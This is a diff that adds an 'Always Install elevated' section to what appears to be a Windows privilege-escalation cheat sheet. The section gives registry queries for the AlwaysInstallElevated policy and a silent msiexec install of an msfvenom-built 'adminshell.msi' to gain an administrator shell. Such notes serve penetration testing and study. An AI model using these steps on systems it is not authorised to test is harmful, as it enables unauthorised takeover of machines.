@@ -181,6 +181,24 @@ Get next run time with Get-ScheduledTaskInfo
 Get-ScheduledTaskInfo <TaskPath>\<TaskName>
 ```
 
+### Always Install elevated
+
+Enumerate
+```
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# Enabled: 0x1
+```
+
+Exploit
+```
+# Create adminshell.msi with msfvenom
+
+msiexec /quiet /qn /i adminshell.msi
+```
+
 # Spawning admin shell
 
 ## Non interactive
